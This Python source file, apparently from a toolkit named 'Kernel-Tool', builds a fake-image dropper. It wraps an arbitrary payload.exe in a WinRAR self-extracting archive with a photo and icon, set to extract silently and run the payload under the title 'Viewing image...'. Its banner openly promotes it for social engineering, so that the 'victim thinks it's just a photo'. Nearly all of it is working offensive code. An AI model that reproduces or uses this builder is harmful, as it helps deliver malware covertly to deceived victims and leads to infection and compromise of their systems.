# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ------------------------------------------------------------------------------------------------
# EN:
#     - Do not touch or modify the code below. If there is an error, please contact the owner,
#       but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR:
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le
#       propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
# ------------------------------------------------------------------------------------------------

import os
import sys
import subprocess
import shutil
import random
from Config.Config import exe_to_image_banner

LC = "\033[38;2;0;200;255m"
RS = "\033[0m"


class EXEtoImageBuilder:
    def __init__(self):
        self.output_folder = os.path.join(os.getcwd(), "output")
        self.icon_path = None
        self.image_path = None
        self.payload_path = None
        self.output_exe = None
        self.winrar_path = self._find_winrar()

    def _find_winrar(self):
        candidates = [
            r"C:\Program Files\WinRAR\WinRAR.exe",
            r"C:\Program Files (x86)\WinRAR\WinRAR.exe",
            r"C:\WinRAR\WinRAR.exe",
        ]
        for path in candidates:
            if os.path.exists(path):
                return path
        return None

    def _log(self, msg, prefix="[+]"):
        print(f"{LC}{prefix} {msg}{RS}")

    def print_banner(self):
        print(exe_to_image_banner)
        lines = [
            "============================= EXE to Fake Image Builder ==============================",
            "Creates a self-extracting .exe that looks like an image",
            "Uses your custom icon + background image",
            "Silently executes your payload.exe in background",
            "Perfect for social engineering – victim thinks it's just a photo",
            "Output in 'output' folder",
            "=====================================================================================",
        ]
        for line in lines:
            self._log(line)
        print()

    def get_user_input(self):
        os.makedirs(self.output_folder, exist_ok=True)
        self._log("Enter the full paths to your files:\n", prefix="[*]")

        use_icon = input(f"{LC}Do you want a custom icon? (y/n, default n): {RS}").strip().lower()
        if use_icon == "y":
            icon_path = input(f"{LC}Enter full path to .ico file: {RS}").strip()
            if os.path.exists(icon_path) and icon_path.lower().endswith(".ico"):
                self.icon_path = icon_path
                self._log(f"Icon selected: {self.icon_path}")
            else:
                self._log("Invalid or non-existent icon – compiling without custom icon", prefix="[-]")

        image_path = input(f"{LC}Enter full path to image (jpg/png): {RS}").strip()
        if not os.path.exists(image_path) or not image_path.lower().endswith((".jpg", ".jpeg", ".png")):
            self._log("ERROR: Invalid image path or format!", prefix="[-]")
            sys.exit(1)
        self.image_path = image_path
        self._log(f"Image selected: {self.image_path}")

        payload_path = input(f"{LC}Enter full path to payload.exe: {RS}").strip()
        if not os.path.exists(payload_path) or not payload_path.lower().endswith(".exe"):
            self._log("ERROR: Invalid payload path!", prefix="[-]")
            sys.exit(1)
        self.payload_path = payload_path
        self._log(f"Payload selected: {self.payload_path}")

        output_name = input(f"{LC}Enter output filename (default: picture.exe): {RS}").strip() or "picture.exe"
        if not output_name.lower().endswith(".exe"):
            output_name += ".exe"
        self.output_exe = os.path.join(self.output_folder, output_name)

    def _create_sfx_config(self, temp_dir):
        payload_name = os.path.basename(self.payload_path)
        config_content = (
            f"Path=%TEMP%\n"
            f"Silent=1\n"
            f"Overwrite=1\n"
            f"Setup={payload_name}\n"
            f"TempMode\n"
            f"Title=Viewing image...\n"
        )
        config_path = os.path.join(temp_dir, "sfx_config.txt")
        with open(config_path, "w") as f:
            f.write(config_content)
        return config_path

    def build(self):
        if not self.winrar_path:
            self._log("ERROR: WinRAR not found! Install WinRAR.", prefix="[-]")
            sys.exit(1)

        self._log("WinRAR found – building fake image...")

        temp_dir = os.path.join(self.output_folder, f"temp_{random.randint(10000, 99999)}")
        os.makedirs(temp_dir, exist_ok=True)

        try:
            shutil.copy(self.payload_path, temp_dir)

            image_ext = os.path.splitext(self.image_path)[1].lower()
            normalized_image = os.path.join(temp_dir, f"photo{image_ext}")
            shutil.copy(self.image_path, normalized_image)

            config_path = self._create_sfx_config(temp_dir)

            sfx_module = os.path.join(os.path.dirname(self.winrar_path), "Default.SFX")
            sfx_option = [f"-sfx{sfx_module}"] if os.path.exists(sfx_module) else ["-sfx"]

            icon_option = [f"-iicon{self.icon_path}"] if self.icon_path else []

            command = [
                self.winrar_path,
                "a",
                "-ep1",
                "-inul",
                *sfx_option,
                f"-z{config_path}",
                *icon_option,
                self.output_exe,
                os.path.join(temp_dir, "*"),
            ]

            self._log("Creating SFX executable...", prefix="[*]")
            result = subprocess.run(command, capture_output=True, text=True)

            if result.returncode == 0 and os.path.exists(self.output_exe):
                self._log(f"SUCCESS! Fake image created: {self.output_exe}")
                self._log("Double-click → opens as image + runs payload silently")
            else:
                self._log("ERROR:", prefix="[-]")
                print(LC + (result.stderr or result.stdout) + RS)

        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
            self._log("Cleanup done")

        input(f"{LC}[+] Press Enter to exit...{RS}")


if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    builder = EXEtoImageBuilder()
    builder.print_banner()
    builder.get_user_input()
    builder.build()
